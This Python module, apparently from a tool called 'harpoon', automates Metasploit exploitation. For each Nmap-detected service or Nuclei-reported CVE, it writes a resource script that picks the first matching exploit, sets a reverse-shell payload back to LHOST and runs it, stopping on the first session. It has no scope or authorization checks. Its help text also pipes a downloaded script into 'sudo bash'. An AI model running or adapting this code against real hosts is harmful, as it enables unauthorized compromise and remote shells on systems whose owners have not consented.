"""Metasploit automation: search and run exploits per Nmap service."""
import os
import re
from pathlib import Path
from typing import Optional

from harpoon.config import LOG_DIR, MSF_LOCAL, MSF_LOCAL_CWD, MSFCONSOLE_CMD, MSF_LOG
from harpoon.parsers.nmap_parser import ServiceInfo
from harpoon.runner import find_cmd, run_capture

# Common Windows Metasploit paths (installer default: C:\metasploit-framework)
# See: https://www.metasploit.com/download → Windows .msi installer
MSF_WIN_PATHS = [
    Path("C:/metasploit-framework/bin/msfconsole.bat"),
    Path("C:/metasploit-framework/bin/msfconsole"),
    Path("C:/Metasploit-framework/bin/msfconsole.bat"),  # installer default (capital M)
    Path(os.environ.get("ProgramFiles", "C:/Program Files")) / "Metasploit" / "bin" / "msfconsole.bat",
    Path(os.environ.get("ProgramFiles", "C:/Program Files")) / "Metasploit" / "bin" / "msfconsole",
    Path(os.environ.get("ProgramFiles(x86)", "C:/Program Files (x86)")) / "Metasploit" / "bin" / "msfconsole.bat",
    Path(os.environ.get("LocalAppData", "")) / "Programs" / "metasploit-framework" / "bin" / "msfconsole.bat",
]


def _msf_path() -> tuple[Optional[str], bool]:
    """
    Return (path, use_ruby). use_ruby=True means invoke as 'ruby path' with cwd=path.parent.
    """
    p = find_cmd("msfconsole") or find_cmd(MSFCONSOLE_CMD.split()[0])
    if p:
        return p, False
    for path in MSF_WIN_PATHS:
        if path.exists():
            return str(path), False
    # Local metasploit-framework-master (Ruby script)
    for root in (MSF_LOCAL, MSF_LOCAL_CWD):
        msf = root / "msfconsole"
        if msf.exists():
            return str(msf), True
    return None, False


# Map Nmap service names to precise Metasploit search terms (e.g. telnetd → telnet)
SERVICE_SEARCH_TERMS: dict[str, str] = {
    "telnet": "telnet",
    "telnetd": "telnet",
    "ftp": "ftp",
    "ssh": "ssh",
    "smb": "smb",
    "samba": "samba",
    "mysql": "mysql",
    "mssql": "mssql",
    "postgresql": "postgres",
    "redis": "redis",
    "mongodb": "mongodb",
    "vnc": "vnc",
    "rdp": "rdp",
    "rpc": "rpc",
    "nfs": "nfs",
    "snmp": "snmp",
    "ldap": "ldap",
    "apache": "apache",
    "httpd": "apache",
    "nginx": "nginx",
    "tomcat": "tomcat",
    "jboss": "jboss",
    "weblogic": "weblogic",
    "iis": "iis",
    "exchange": "exchange",
}


def _search_term_for_service(svc: ServiceInfo) -> str:
    """Return optimized Metasploit search term for a given service."""
    combined = f"{svc.service} {svc.product} {svc.version}".lower()
    for key, term in SERVICE_SEARCH_TERMS.items():
        if key in combined:
            return term
    return svc.search_term


def _parse_cves_from_nuclei(text: str) -> list[str]:
    """Extract CVE IDs from Nuclei output."""
    cves: list[str] = []
    for m in re.finditer(r"CVE-\d{4}-\d{4,}", (text or ""), re.IGNORECASE):
        cve = m.group(0).upper()
        if cve not in cves:
            cves.append(cve)
    return cves[:10]


def run_metasploit_for_services(
    target_host: str,
    services: list[ServiceInfo],
    lhost: str = "127.0.0.1",
    log_path: Path = MSF_LOG,
    nuclei_log: Path | None = None,
    timeout_per_exploit: int = 120,
    max_exploits_per_service: int = 3,
) -> tuple[bool, str]:
    """
    For each service, generate an MSF resource script that searches and runs
    exploits. Run msfconsole -q -r script.rc. If a shell/session is obtained,
    stop and return (True, message). Otherwise return (False, summary).
    """
    msf, use_ruby = _msf_path()
    if not msf:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        help_msg = (
            "Metasploit (msfconsole) not found.\n\n"
            "Windows: Download the .msi from https://windows.metasploit.com/metasploitframework-latest.msi\n"
            "         Run as Administrator. Default install: C:\\metasploit-framework\\bin\\\n"
            "         Add that bin folder to PATH, or set: HARPOON_MSFCONSOLE=C:\\metasploit-framework\\bin\\msfconsole.bat\n\n"
            "Linux:   curl -sL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash"
        )
        log_path.write_text(help_msg, encoding="utf-8")
        return False, "Metasploit not found; see log."

    LOG_DIR.mkdir(parents=True, exist_ok=True)
    log_lines: list[str] = []
    success = False

    for svc in services:
        if success:
            break
        term = _search_term_for_service(svc)
        port = svc.port
        rc_content = f"""search type:exploit {term}
use 0
set RHOSTS {target_host}
set RPORT {port}
set payload generic/shell_reverse_tcp
set LHOST {lhost}
run
exit
"""
        rc_path = LOG_DIR / f"msf_{svc.port}_{svc.service.replace('/', '_')}.rc"
        rc_path.write_text(rc_content, encoding="utf-8")
        argv = ["ruby", msf, "-q", "-r", str(rc_path)] if use_ruby else [msf, "-q", "-r", str(rc_path)]
        cwd = Path(msf).parent if use_ruby else None
        code, out, err = run_capture(
            argv,
            LOG_DIR / f"msf_out_{svc.port}.txt",
            timeout=timeout_per_exploit,
            cwd=cwd,
        )
        log_lines.append(f"--- Port {port} ({svc.service}) ---\n{out}\n{err}\n")
        if "session" in out.lower() or "shell" in out.lower() or "meterpreter" in out.lower():
            success = True
            log_lines.append("Stopping exploitation after successful compromise.")
            break

    # Try Nuclei CVEs if no success yet
    if not success and nuclei_log and nuclei_log.exists():
        try:
            nuclei_text = nuclei_log.read_text(encoding="utf-8", errors="replace")
            cves = _parse_cves_from_nuclei(nuclei_text)
            for cve in cves:
                if success:
                    break
                rc_content = f"""search cve:{cve}
use 0
set RHOSTS {target_host}
set payload generic/shell_reverse_tcp
set LHOST {lhost}
run
exit
"""
                rc_path = LOG_DIR / f"msf_cve_{cve.replace('-', '_')}.rc"
                rc_path.write_text(rc_content, encoding="utf-8")
                argv = ["ruby", msf, "-q", "-r", str(rc_path)] if use_ruby else [msf, "-q", "-r", str(rc_path)]
                cwd = Path(msf).parent if use_ruby else None
                code, out, err = run_capture(argv, LOG_DIR / f"msf_out_{cve}.txt", timeout=timeout_per_exploit, cwd=cwd)
                log_lines.append(f"--- CVE {cve} ---\n{out}\n{err}\n")
                if "session" in out.lower() or "shell" in out.lower() or "meterpreter" in out.lower():
                    success = True
                    log_lines.append("Stopping exploitation after successful compromise.")
        except OSError:
            pass

    log_path.write_text("\n".join(log_lines), encoding="utf-8", errors="replace")
    msg = "Metasploit: exploitation run complete." if not success else "Metasploit: possible compromise (check logs)."
    return success, msg
